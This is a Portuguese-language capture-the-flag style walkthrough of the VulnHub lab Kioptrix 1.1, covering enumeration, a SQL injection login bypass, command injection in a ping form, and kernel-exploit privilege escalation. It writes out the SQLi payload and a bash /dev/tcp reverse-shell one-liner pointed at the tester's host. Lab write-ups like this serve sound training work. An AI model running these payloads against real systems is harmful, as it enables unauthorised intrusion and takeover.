---
title: "VulnHub - Kioptrix 1.1"
tags: [Linux,Easy,Web,Gobuster,SQLInjection,Kernel,Linpeas]
categories: VulnHub OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/inicial.png)

Link: [Kioptrix 1.1](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.0/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/nmap.png)

Full ports scan

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/nmap1.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

> -T5 --> Modo insano

### Verificamos que temos 7 portas abertas no servidor

> Porta 22 -> SSH

> Portas 80 e 443 -> Web

> Porta 111 -> Samba

> Porta 631 -> ipp?!

> Porta 1000 -> cadlock?!

> Porta 3306 -> mysql

## Enumeração da Porta 80

Acessamos a página web para verificar do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/web.png)

Gobuster nela

```bash
gobuster dir -u http://192.168.56.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 30
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/gobuster.png)

Bom, apareceu um campo de login e senha, possivelmente temos que bypassar ele

http://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html

Jogamos para o BurpSuite para facilitar o trabalho

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/burp1.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/burp2.png)

```
uname=admin'+or+'1'='1&psw=senha&btnLogin=Login
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/burp3.png)

Possível query que está sendo feita:

```
SELECT * FROM users WHERE username='' AND password=''
```

O nosso payload:

```
SELECT * FROM users WHERE username='1' or '1'='1' AND password='1' or '1'='1'
```

Fazemos o Bypass

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/burp4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/burp5.png)

Jogamos para o Burp

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/burp6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/burp7.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/burp8.png)

Testamos pingar nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/burp9.png)

Aqui fica fácil ter o RCE, se colocarmos um ; depois do ip vamos ter RCE

Demonstração, ele executa um comando e depois o outro

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/burp10.png)

Agora testamos no Burp

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/burp11.png)

# apache -> root

Agora pegamos o Reverse Shell

```bash
bash -i >& /dev/tcp/192.168.56.102/443 0>&1
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/burp12.png)

Agora vamos iniciar a escalação de privilégios nessa máquina, para isso utilizaremos o Linpeas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/lin.png)

Passamos para nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/lin1.png)

Executamos na máquina remota

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/lin2.png)

Verificamos de cara que a versão do Kernel é muito antiga

```
Linux version 2.6.9-55.EL
```

https://www.exploit-db.com/exploits/9545

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/exp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/exp1.png)

Executamos e viramos root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub/vulnhub-kioptrix1.1/exp2.png)